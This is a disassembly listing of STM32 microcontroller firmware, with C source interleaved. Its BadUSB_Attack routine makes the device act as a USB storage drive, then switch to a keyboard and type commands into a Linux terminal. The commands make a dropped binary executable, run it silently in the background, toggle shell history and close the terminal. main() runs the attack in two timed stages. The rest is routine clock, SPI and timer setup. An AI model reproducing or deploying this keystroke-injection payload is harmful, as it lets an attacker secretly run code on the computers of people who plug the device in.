 8000ac8:	4618      	mov	r0, r3
 8000aca:	f7ff fb7f 	bl	80001cc <strlen>
 8000ace:	4603      	mov	r3, r0
 8000ad0:	461a      	mov	r2, r3
 8000ad2:	f107 0308 	add.w	r3, r7, #8
 8000ad6:	4413      	add	r3, r2
 8000ad8:	4a69      	ldr	r2, [pc, #420]	; (8000c80 <BadUSB_Attack+0x2e0>)
 8000ada:	6810      	ldr	r0, [r2, #0]
 8000adc:	6018      	str	r0, [r3, #0]
 8000ade:	8892      	ldrh	r2, [r2, #4]
 8000ae0:	809a      	strh	r2, [r3, #4]
		SimulateShortcutKey(Terminal, 3);
 8000ae2:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000ae6:	2103      	movs	r1, #3
 8000ae8:	4618      	mov	r0, r3
 8000aea:	f7ff fe7d 	bl	80007e8 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
 8000aee:	f107 0308 	add.w	r3, r7, #8
 8000af2:	4618      	mov	r0, r3
 8000af4:	f7ff fb6a 	bl	80001cc <strlen>
 8000af8:	4603      	mov	r3, r0
 8000afa:	4619      	mov	r1, r3
 8000afc:	f107 0308 	add.w	r3, r7, #8
 8000b00:	4a60      	ldr	r2, [pc, #384]	; (8000c84 <BadUSB_Attack+0x2e4>)
 8000b02:	4618      	mov	r0, r3
 8000b04:	f7ff fe9c 	bl	8000840 <SimulateKeyStrokes>
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
#endif
}
 8000b08:	e0a8      	b.n	8000c5c <BadUSB_Attack+0x2bc>
	}else if(stage == 1){
 8000b0a:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b0e:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000b12:	681b      	ldr	r3, [r3, #0]
 8000b14:	2b01      	cmp	r3, #1
 8000b16:	f040 808b 	bne.w	8000c30 <BadUSB_Attack+0x290>
		uint8_t Terminal[3] = LinuxTerminal;
 8000b1a:	4a53      	ldr	r2, [pc, #332]	; (8000c68 <BadUSB_Attack+0x2c8>)
 8000b1c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b20:	6812      	ldr	r2, [r2, #0]
 8000b22:	4611      	mov	r1, r2
 8000b24:	8019      	strh	r1, [r3, #0]
 8000b26:	3302      	adds	r3, #2
 8000b28:	0c12      	lsrs	r2, r2, #16
 8000b2a:	701a      	strb	r2, [r3, #0]
		char AttackStr1[256] = {'\0'};
 8000b2c:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000b30:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8000b34:	2200      	movs	r2, #0
 8000b36:	601a      	str	r2, [r3, #0]
 8000b38:	3304      	adds	r3, #4
 8000b3a:	22fc      	movs	r2, #252	; 0xfc
 8000b3c:	2100      	movs	r1, #0
 8000b3e:	4618      	mov	r0, r3
 8000b40:	f00c fb6c 	bl	800d21c <memset>
		strcat(AttackStr1, "cd /home/user/Templates\n");
 8000b44:	f107 0308 	add.w	r3, r7, #8
 8000b48:	4618      	mov	r0, r3
 8000b4a:	f7ff fb3f 	bl	80001cc <strlen>
 8000b4e:	4603      	mov	r3, r0
 8000b50:	461a      	mov	r2, r3
 8000b52:	f107 0308 	add.w	r3, r7, #8
 8000b56:	4413      	add	r3, r2
 8000b58:	4a45      	ldr	r2, [pc, #276]	; (8000c70 <BadUSB_Attack+0x2d0>)
 8000b5a:	461d      	mov	r5, r3
 8000b5c:	4614      	mov	r4, r2
 8000b5e:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000b60:	6028      	str	r0, [r5, #0]
 8000b62:	6069      	str	r1, [r5, #4]
 8000b64:	60aa      	str	r2, [r5, #8]
 8000b66:	60eb      	str	r3, [r5, #12]
 8000b68:	cc03      	ldmia	r4!, {r0, r1}
 8000b6a:	6128      	str	r0, [r5, #16]
 8000b6c:	6169      	str	r1, [r5, #20]
 8000b6e:	7823      	ldrb	r3, [r4, #0]
 8000b70:	762b      	strb	r3, [r5, #24]
		strcat(AttackStr1, "chmod 777 MSCDrv\n");
 8000b72:	f107 0308 	add.w	r3, r7, #8
 8000b76:	4618      	mov	r0, r3
 8000b78:	f7ff fb28 	bl	80001cc <strlen>
 8000b7c:	4603      	mov	r3, r0
 8000b7e:	461a      	mov	r2, r3
 8000b80:	f107 0308 	add.w	r3, r7, #8
 8000b84:	4413      	add	r3, r2
 8000b86:	4a40      	ldr	r2, [pc, #256]	; (8000c88 <BadUSB_Attack+0x2e8>)
 8000b88:	461d      	mov	r5, r3
 8000b8a:	4614      	mov	r4, r2
 8000b8c:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000b8e:	6028      	str	r0, [r5, #0]
 8000b90:	6069      	str	r1, [r5, #4]
 8000b92:	60aa      	str	r2, [r5, #8]
 8000b94:	60eb      	str	r3, [r5, #12]
 8000b96:	8823      	ldrh	r3, [r4, #0]
 8000b98:	822b      	strh	r3, [r5, #16]
		strcat(AttackStr1, "./MSCDrv >/dev/null 2>&1 &\n");
 8000b9a:	f107 0308 	add.w	r3, r7, #8
 8000b9e:	4618      	mov	r0, r3
 8000ba0:	f7ff fb14 	bl	80001cc <strlen>
 8000ba4:	4603      	mov	r3, r0
 8000ba6:	461a      	mov	r2, r3
 8000ba8:	f107 0308 	add.w	r3, r7, #8
 8000bac:	4413      	add	r3, r2
 8000bae:	4a37      	ldr	r2, [pc, #220]	; (8000c8c <BadUSB_Attack+0x2ec>)
 8000bb0:	461d      	mov	r5, r3
 8000bb2:	4614      	mov	r4, r2
 8000bb4:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000bb6:	6028      	str	r0, [r5, #0]
 8000bb8:	6069      	str	r1, [r5, #4]
 8000bba:	60aa      	str	r2, [r5, #8]
 8000bbc:	60eb      	str	r3, [r5, #12]
 8000bbe:	cc07      	ldmia	r4!, {r0, r1, r2}
 8000bc0:	6128      	str	r0, [r5, #16]
 8000bc2:	6169      	str	r1, [r5, #20]
 8000bc4:	61aa      	str	r2, [r5, #24]
		strcat(AttackStr1, "set -o history\n");
 8000bc6:	f107 0308 	add.w	r3, r7, #8
 8000bca:	4618      	mov	r0, r3
 8000bcc:	f7ff fafe 	bl	80001cc <strlen>
 8000bd0:	4603      	mov	r3, r0
 8000bd2:	461a      	mov	r2, r3
 8000bd4:	f107 0308 	add.w	r3, r7, #8
 8000bd8:	4413      	add	r3, r2
 8000bda:	4a2d      	ldr	r2, [pc, #180]	; (8000c90 <BadUSB_Attack+0x2f0>)
 8000bdc:	461c      	mov	r4, r3
 8000bde:	4615      	mov	r5, r2
 8000be0:	cd0f      	ldmia	r5!, {r0, r1, r2, r3}
 8000be2:	6020      	str	r0, [r4, #0]
 8000be4:	6061      	str	r1, [r4, #4]
 8000be6:	60a2      	str	r2, [r4, #8]
 8000be8:	60e3      	str	r3, [r4, #12]
		strcat(AttackStr1, "exit\n");
 8000bea:	f107 0308 	add.w	r3, r7, #8
 8000bee:	4618      	mov	r0, r3
 8000bf0:	f7ff faec 	bl	80001cc <strlen>
 8000bf4:	4603      	mov	r3, r0
 8000bf6:	461a      	mov	r2, r3
 8000bf8:	f107 0308 	add.w	r3, r7, #8
 8000bfc:	4413      	add	r3, r2
 8000bfe:	4a20      	ldr	r2, [pc, #128]	; (8000c80 <BadUSB_Attack+0x2e0>)
 8000c00:	6810      	ldr	r0, [r2, #0]
 8000c02:	6018      	str	r0, [r3, #0]
 8000c04:	8892      	ldrh	r2, [r2, #4]
 8000c06:	809a      	strh	r2, [r3, #4]
		SimulateShortcutKey(Terminal, 3);
 8000c08:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000c0c:	2103      	movs	r1, #3
 8000c0e:	4618      	mov	r0, r3
 8000c10:	f7ff fdea 	bl	80007e8 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
 8000c14:	f107 0308 	add.w	r3, r7, #8
 8000c18:	4618      	mov	r0, r3
 8000c1a:	f7ff fad7 	bl	80001cc <strlen>
 8000c1e:	4603      	mov	r3, r0
 8000c20:	4619      	mov	r1, r3
 8000c22:	f107 0308 	add.w	r3, r7, #8
 8000c26:	4a17      	ldr	r2, [pc, #92]	; (8000c84 <BadUSB_Attack+0x2e4>)
 8000c28:	4618      	mov	r0, r3
 8000c2a:	f7ff fe09 	bl	8000840 <SimulateKeyStrokes>
}
 8000c2e:	e015      	b.n	8000c5c <BadUSB_Attack+0x2bc>
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
 8000c30:	f107 0308 	add.w	r3, r7, #8
 8000c34:	4a17      	ldr	r2, [pc, #92]	; (8000c94 <BadUSB_Attack+0x2f4>)
 8000c36:	4618      	mov	r0, r3
 8000c38:	4611      	mov	r1, r2
 8000c3a:	234e      	movs	r3, #78	; 0x4e
 8000c3c:	461a      	mov	r2, r3
 8000c3e:	f00c fb19 	bl	800d274 <memcpy>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000c42:	f107 0308 	add.w	r3, r7, #8
 8000c46:	4618      	mov	r0, r3
 8000c48:	f7ff fac0 	bl	80001cc <strlen>
 8000c4c:	4603      	mov	r3, r0
 8000c4e:	4619      	mov	r1, r3
 8000c50:	f107 0308 	add.w	r3, r7, #8
 8000c54:	4a0b      	ldr	r2, [pc, #44]	; (8000c84 <BadUSB_Attack+0x2e4>)
 8000c56:	4618      	mov	r0, r3
 8000c58:	f7ff fdf2 	bl	8000840 <SimulateKeyStrokes>
}
 8000c5c:	bf00      	nop
 8000c5e:	f507 7788 	add.w	r7, r7, #272	; 0x110
 8000c62:	46bd      	mov	sp, r7
 8000c64:	bdb0      	pop	{r4, r5, r7, pc}
 8000c66:	bf00      	nop
 8000c68:	0800d43c 	.word	0x0800d43c
 8000c6c:	0800d330 	.word	0x0800d330
 8000c70:	0800d340 	.word	0x0800d340
 8000c74:	0800d35c 	.word	0x0800d35c
 8000c78:	0800d378 	.word	0x0800d378
 8000c7c:	0800d388 	.word	0x0800d388
 8000c80:	0800d3a4 	.word	0x0800d3a4
 8000c84:	20000278 	.word	0x20000278
 8000c88:	0800d3ac 	.word	0x0800d3ac
 8000c8c:	0800d3c0 	.word	0x0800d3c0
 8000c90:	0800d3dc 	.word	0x0800d3dc
 8000c94:	0800d3ec 	.word	0x0800d3ec

08000c98 <main>:
/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
 8000c98:	b580      	push	{r7, lr}
 8000c9a:	b082      	sub	sp, #8
 8000c9c:	af00      	add	r7, sp, #0
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();
 8000c9e:	f000 fb3e 	bl	800131e <HAL_Init>
  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();
 8000ca2:	f000 f85f 	bl	8000d64 <SystemClock_Config>
  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
 8000ca6:	f7ff fc17 	bl	80004d8 <MX_GPIO_Init>
  MX_USART2_UART_Init();
 8000caa:	f000 fa75 	bl	8001198 <MX_USART2_UART_Init>
  MX_SPI1_Init();
 8000cae:	f000 f90d 	bl	8000ecc <MX_SPI1_Init>
  /* USER CODE BEGIN 2 */
  int flag = 0;
 8000cb2:	2300      	movs	r3, #0
 8000cb4:	607b      	str	r3, [r7, #4]
  isMSC = 1;
 8000cb6:	4b27      	ldr	r3, [pc, #156]	; (8000d54 <main+0xbc>)
 8000cb8:	2201      	movs	r2, #1
 8000cba:	601a      	str	r2, [r3, #0]
  uint32_t Flash_Busy;
  MX_USB_DEVICE_Init_MSC();
 8000cbc:	f00b fca6 	bl	800c60c <MX_USB_DEVICE_Init_MSC>

  memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000cc0:	220f      	movs	r2, #15
 8000cc2:	2100      	movs	r1, #0
 8000cc4:	4824      	ldr	r0, [pc, #144]	; (8000d58 <main+0xc0>)
 8000cc6:	f00c faa9 	bl	800d21c <memset>

  flag = 1;
 8000cca:	2301      	movs	r3, #1
 8000ccc:	607b      	str	r3, [r7, #4]
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while(1){
	  InterruptTrap(&InterruptFlag);
 8000cce:	4823      	ldr	r0, [pc, #140]	; (8000d5c <main+0xc4>)
 8000cd0:	f7ff fe20 	bl	8000914 <InterruptTrap>
	  Flash_Busy = __HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY);
 8000cd4:	4b22      	ldr	r3, [pc, #136]	; (8000d60 <main+0xc8>)
 8000cd6:	691b      	ldr	r3, [r3, #16]
 8000cd8:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8000cdc:	2b00      	cmp	r3, #0
 8000cde:	bf14      	ite	ne
 8000ce0:	2301      	movne	r3, #1
 8000ce2:	2300      	moveq	r3, #0
 8000ce4:	b2db      	uxtb	r3, r3
 8000ce6:	603b      	str	r3, [r7, #0]
	  switch(flag){
 8000ce8:	687b      	ldr	r3, [r7, #4]
 8000cea:	2b01      	cmp	r3, #1
 8000cec:	d003      	beq.n	8000cf6 <main+0x5e>
 8000cee:	687b      	ldr	r3, [r7, #4]
 8000cf0:	2b02      	cmp	r3, #2
 8000cf2:	d01c      	beq.n	8000d2e <main+0x96>
		  }
		  flag = 0;
		  SwitchToMSC();
		  break;
	  default:
		  break;
 8000cf4:	e02c      	b.n	8000d50 <main+0xb8>
		  HAL_Delay(10000);
 8000cf6:	f242 7010 	movw	r0, #10000	; 0x2710
 8000cfa:	f000 fb85 	bl	8001408 <HAL_Delay>
			  if(!Flash_Busy){
 8000cfe:	683b      	ldr	r3, [r7, #0]
 8000d00:	2b00      	cmp	r3, #0
 8000d02:	d1fc      	bne.n	8000cfe <main+0x66>
				  SwitchToHID();
 8000d04:	f7ff fc56 	bl	80005b4 <SwitchToHID>
				  while(!TestHID())
 8000d08:	e003      	b.n	8000d12 <main+0x7a>
					  HAL_Delay(TestHIDSlot);
 8000d0a:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 8000d0e:	f000 fb7b 	bl	8001408 <HAL_Delay>
				  while(!TestHID())
 8000d12:	f7ff fe1d 	bl	8000950 <TestHID>
 8000d16:	4603      	mov	r3, r0
 8000d18:	2b00      	cmp	r3, #0
 8000d1a:	d0f6      	beq.n	8000d0a <main+0x72>
				  BadUSB_Attack(0);
 8000d1c:	2000      	movs	r0, #0
 8000d1e:	f7ff fe3f 	bl	80009a0 <BadUSB_Attack>
				  break;
 8000d22:	bf00      	nop
		  flag = 2;
 8000d24:	2302      	movs	r3, #2
 8000d26:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 8000d28:	f7ff fc5c 	bl	80005e4 <SwitchToMSC>
		  break;
 8000d2c:	e010      	b.n	8000d50 <main+0xb8>
		  HAL_Delay(20000);
 8000d2e:	f644 6020 	movw	r0, #20000	; 0x4e20
 8000d32:	f000 fb69 	bl	8001408 <HAL_Delay>
			  if(!Flash_Busy){
 8000d36:	683b      	ldr	r3, [r7, #0]
 8000d38:	2b00      	cmp	r3, #0
 8000d3a:	d1fc      	bne.n	8000d36 <main+0x9e>
				  SwitchToHID();
 8000d3c:	f7ff fc3a 	bl	80005b4 <SwitchToHID>
				  BadUSB_Attack(1);
 8000d40:	2001      	movs	r0, #1
 8000d42:	f7ff fe2d 	bl	80009a0 <BadUSB_Attack>
				  break;
 8000d46:	bf00      	nop
		  flag = 0;
 8000d48:	2300      	movs	r3, #0
 8000d4a:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 8000d4c:	f7ff fc4a 	bl	80005e4 <SwitchToMSC>
	  InterruptTrap(&InterruptFlag);
 8000d50:	e7bd      	b.n	8000cce <main+0x36>
 8000d52:	bf00      	nop
 8000d54:	20000978 	.word	0x20000978
 8000d58:	2000025c 	.word	0x2000025c
 8000d5c:	20000270 	.word	0x20000270
 8000d60:	40022000 	.word	0x40022000

08000d64 <SystemClock_Config>:
/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
 8000d64:	b580      	push	{r7, lr}
 8000d66:	b096      	sub	sp, #88	; 0x58
 8000d68:	af00      	add	r7, sp, #0
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
 8000d6a:	f107 0314 	add.w	r3, r7, #20
 8000d6e:	2244      	movs	r2, #68	; 0x44
 8000d70:	2100      	movs	r1, #0
 8000d72:	4618      	mov	r0, r3
 8000d74:	f00c fa52 	bl	800d21c <memset>
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
 8000d78:	463b      	mov	r3, r7
 8000d7a:	2200      	movs	r2, #0
 8000d7c:	601a      	str	r2, [r3, #0]
 8000d7e:	605a      	str	r2, [r3, #4]
 8000d80:	609a      	str	r2, [r3, #8]
 8000d82:	60da      	str	r2, [r3, #12]
 8000d84:	611a      	str	r2, [r3, #16]

  /** Configure the main internal regulator output voltage
  */
  if (HAL_PWREx_ControlVoltageScaling(PWR_REGULATOR_VOLTAGE_SCALE1) != HAL_OK)
 8000d86:	f44f 7000 	mov.w	r0, #512	; 0x200
 8000d8a:	f002 fe4f 	bl	8003a2c <HAL_PWREx_ControlVoltageScaling>
 8000d8e:	4603      	mov	r3, r0
 8000d90:	2b00      	cmp	r3, #0
 8000d92:	d001      	beq.n	8000d98 <SystemClock_Config+0x34>
  {
    Error_Handler();
 8000d94:	f000 f894 	bl	8000ec0 <Error_Handler>
  }

  /** Configure LSE Drive Capability
  */
  HAL_PWR_EnableBkUpAccess();
 8000d98:	f002 fe2a 	bl	80039f0 <HAL_PWR_EnableBkUpAccess>
  __HAL_RCC_LSEDRIVE_CONFIG(RCC_LSEDRIVE_LOW);
 8000d9c:	4b21      	ldr	r3, [pc, #132]	; (8000e24 <SystemClock_Config+0xc0>)
 8000d9e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8000da2:	4a20      	ldr	r2, [pc, #128]	; (8000e24 <SystemClock_Config+0xc0>)
 8000da4:	f023 0318 	bic.w	r3, r3, #24
 8000da8:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_LSE|RCC_OSCILLATORTYPE_MSI;
 8000dac:	2314      	movs	r3, #20
 8000dae:	617b      	str	r3, [r7, #20]
  RCC_OscInitStruct.LSEState = RCC_LSE_ON;
 8000db0:	2301      	movs	r3, #1
 8000db2:	61fb      	str	r3, [r7, #28]
  RCC_OscInitStruct.MSIState = RCC_MSI_ON;
 8000db4:	2301      	movs	r3, #1
 8000db6:	62fb      	str	r3, [r7, #44]	; 0x2c
  RCC_OscInitStruct.MSICalibrationValue = 0;
 8000db8:	2300      	movs	r3, #0
 8000dba:	633b      	str	r3, [r7, #48]	; 0x30
  RCC_OscInitStruct.MSIClockRange = RCC_MSIRANGE_6;
 8000dbc:	2360      	movs	r3, #96	; 0x60
 8000dbe:	637b      	str	r3, [r7, #52]	; 0x34
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
 8000dc0:	2302      	movs	r3, #2
 8000dc2:	63fb      	str	r3, [r7, #60]	; 0x3c
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_MSI;
 8000dc4:	2301      	movs	r3, #1
 8000dc6:	643b      	str	r3, [r7, #64]	; 0x40
  RCC_OscInitStruct.PLL.PLLM = 1;
 8000dc8:	2301      	movs	r3, #1
 8000dca:	647b      	str	r3, [r7, #68]	; 0x44
  RCC_OscInitStruct.PLL.PLLN = 24;
 8000dcc:	2318      	movs	r3, #24
 8000dce:	64bb      	str	r3, [r7, #72]	; 0x48
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV7;
 8000dd0:	2307      	movs	r3, #7
 8000dd2:	64fb      	str	r3, [r7, #76]	; 0x4c
  RCC_OscInitStruct.PLL.PLLQ = RCC_PLLQ_DIV2;
 8000dd4:	2302      	movs	r3, #2
 8000dd6:	653b      	str	r3, [r7, #80]	; 0x50
  RCC_OscInitStruct.PLL.PLLR = RCC_PLLR_DIV2;
 8000dd8:	2302      	movs	r3, #2
 8000dda:	657b      	str	r3, [r7, #84]	; 0x54
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 8000ddc:	f107 0314 	add.w	r3, r7, #20
 8000de0:	4618      	mov	r0, r3
 8000de2:	f002 fe89 	bl	8003af8 <HAL_RCC_OscConfig>
 8000de6:	4603      	mov	r3, r0
 8000de8:	2b00      	cmp	r3, #0
 8000dea:	d001      	beq.n	8000df0 <SystemClock_Config+0x8c>
  {
    Error_Handler();
 8000dec:	f000 f868 	bl	8000ec0 <Error_Handler>
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 8000df0:	230f      	movs	r3, #15
 8000df2:	603b      	str	r3, [r7, #0]
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
 8000df4:	2303      	movs	r3, #3
 8000df6:	607b      	str	r3, [r7, #4]
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
 8000df8:	2300      	movs	r3, #0
 8000dfa:	60bb      	str	r3, [r7, #8]
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 8000dfc:	2300      	movs	r3, #0
 8000dfe:	60fb      	str	r3, [r7, #12]
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
 8000e00:	2300      	movs	r3, #0
 8000e02:	613b      	str	r3, [r7, #16]

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
 8000e04:	463b      	mov	r3, r7
 8000e06:	2102      	movs	r1, #2
 8000e08:	4618      	mov	r0, r3
 8000e0a:	f003 fa89 	bl	8004320 <HAL_RCC_ClockConfig>
 8000e0e:	4603      	mov	r3, r0
 8000e10:	2b00      	cmp	r3, #0
 8000e12:	d001      	beq.n	8000e18 <SystemClock_Config+0xb4>
  {
    Error_Handler();
 8000e14:	f000 f854 	bl	8000ec0 <Error_Handler>
  }

  /** Enable MSI Auto calibration
  */
  HAL_RCCEx_EnableMSIPLLMode();
 8000e18:	f003 fe9c 	bl	8004b54 <HAL_RCCEx_EnableMSIPLLMode>
}
 8000e1c:	bf00      	nop
 8000e1e:	3758      	adds	r7, #88	; 0x58
 8000e20:	46bd      	mov	sp, r7
 8000e22:	bd80      	pop	{r7, pc}
 8000e24:	40021000 	.word	0x40021000

08000e28 <HAL_TIM_PeriodElapsedCallback>:

/* USER CODE BEGIN 4 */
void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
 8000e28:	b580      	push	{r7, lr}
 8000e2a:	b082      	sub	sp, #8
 8000e2c:	af00      	add	r7, sp, #0
 8000e2e:	6078      	str	r0, [r7, #4]
	if(htim == &htim2){
 8000e30:	687b      	ldr	r3, [r7, #4]
 8000e32:	4a1d      	ldr	r2, [pc, #116]	; (8000ea8 <HAL_TIM_PeriodElapsedCallback+0x80>)
 8000e34:	4293      	cmp	r3, r2
 8000e36:	d133      	bne.n	8000ea0 <HAL_TIM_PeriodElapsedCallback+0x78>
		if(InterruptCnt == 0){
 8000e38:	4b1c      	ldr	r3, [pc, #112]	; (8000eac <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000e3a:	681b      	ldr	r3, [r3, #0]
 8000e3c:	2b00      	cmp	r3, #0
 8000e3e:	d108      	bne.n	8000e52 <HAL_TIM_PeriodElapsedCallback+0x2a>
			//Simulate press operation
			Get_Single_Descriptor(128);
 8000e40:	2080      	movs	r0, #128	; 0x80
 8000e42:	f7ff fbe5 	bl	8000610 <Get_Single_Descriptor>
			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000e46:	220f      	movs	r2, #15
 8000e48:	4919      	ldr	r1, [pc, #100]	; (8000eb0 <HAL_TIM_PeriodElapsedCallback+0x88>)
 8000e4a:	481a      	ldr	r0, [pc, #104]	; (8000eb4 <HAL_TIM_PeriodElapsedCallback+0x8c>)
 8000e4c:	f007 feec 	bl	8008c28 <USBD_CUSTOM_HID_SendReport>
 8000e50:	e018      	b.n	8000e84 <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
		}else if(InterruptCnt == 1){
 8000e52:	4b16      	ldr	r3, [pc, #88]	; (8000eac <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000e54:	681b      	ldr	r3, [r3, #0]
 8000e56:	2b01      	cmp	r3, #1
 8000e58:	d10c      	bne.n	8000e74 <HAL_TIM_PeriodElapsedCallback+0x4c>
			//Simulate release operation
			SimulateKeyRelease();
 8000e5a:	f7ff fc9d 	bl	8000798 <SimulateKeyRelease>
			//Judging whether to Interrupt
			if((recv_buffer[0]&0x02) != 0x02)
 8000e5e:	4b16      	ldr	r3, [pc, #88]	; (8000eb8 <HAL_TIM_PeriodElapsedCallback+0x90>)
 8000e60:	781b      	ldrb	r3, [r3, #0]
 8000e62:	f003 0302 	and.w	r3, r3, #2
 8000e66:	2b00      	cmp	r3, #0
 8000e68:	d10c      	bne.n	8000e84 <HAL_TIM_PeriodElapsedCallback+0x5c>
				InterruptCnt = -1;
 8000e6a:	4b10      	ldr	r3, [pc, #64]	; (8000eac <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000e6c:	f04f 32ff 	mov.w	r2, #4294967295
 8000e70:	601a      	str	r2, [r3, #0]
 8000e72:	e007      	b.n	8000e84 <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
		}else{
			//off timer
			TIM2->CR1 &= ~TIM_CR1_CEN;
 8000e74:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000e78:	681b      	ldr	r3, [r3, #0]
 8000e7a:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000e7e:	f023 0301 	bic.w	r3, r3, #1
 8000e82:	6013      	str	r3, [r2, #0]
		}
		InterruptCnt = (InterruptCnt+1)%3;
 8000e84:	4b09      	ldr	r3, [pc, #36]	; (8000eac <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000e86:	681b      	ldr	r3, [r3, #0]
 8000e88:	1c59      	adds	r1, r3, #1
 8000e8a:	4b0c      	ldr	r3, [pc, #48]	; (8000ebc <HAL_TIM_PeriodElapsedCallback+0x94>)
 8000e8c:	fb83 3201 	smull	r3, r2, r3, r1
 8000e90:	17cb      	asrs	r3, r1, #31
 8000e92:	1ad2      	subs	r2, r2, r3
 8000e94:	4613      	mov	r3, r2
 8000e96:	005b      	lsls	r3, r3, #1
 8000e98:	4413      	add	r3, r2
 8000e9a:	1aca      	subs	r2, r1, r3
 8000e9c:	4b03      	ldr	r3, [pc, #12]	; (8000eac <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000e9e:	601a      	str	r2, [r3, #0]
	}
}
 8000ea0:	bf00      	nop
 8000ea2:	3708      	adds	r7, #8
 8000ea4:	46bd      	mov	sp, r7
 8000ea6:	bd80      	pop	{r7, pc}
 8000ea8:	200002e4 	.word	0x200002e4
 8000eac:	20000274 	.word	0x20000274
 8000eb0:	2000025c 	.word	0x2000025c
 8000eb4:	200003c0 	.word	0x200003c0
 8000eb8:	2000026c 	.word	0x2000026c
 8000ebc:	55555556 	.word	0x55555556

08000ec0 <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 8000ec0:	b480      	push	{r7}
 8000ec2:	af00      	add	r7, sp, #0
  \details Disables IRQ interrupts by setting the I-bit in the CPSR.
           Can only be executed in Privileged modes.
 */
__STATIC_FORCEINLINE void __disable_irq(void)
{
  __ASM volatile ("cpsid i" : : : "memory");
 8000ec4:	b672      	cpsid	i
}
 8000ec6:	bf00      	nop
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
 8000ec8:	e7fe      	b.n	8000ec8 <Error_Handler+0x8>
	...

08000ecc <MX_SPI1_Init>:

SPI_HandleTypeDef hspi1;

/* SPI1 init function */
void MX_SPI1_Init(void)
{
 8000ecc:	b580      	push	{r7, lr}
 8000ece:	af00      	add	r7, sp, #0
  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  hspi1.Instance = SPI1;
 8000ed0:	4b1b      	ldr	r3, [pc, #108]	; (8000f40 <MX_SPI1_Init+0x74>)
 8000ed2:	4a1c      	ldr	r2, [pc, #112]	; (8000f44 <MX_SPI1_Init+0x78>)
 8000ed4:	601a      	str	r2, [r3, #0]
  hspi1.Init.Mode = SPI_MODE_MASTER;
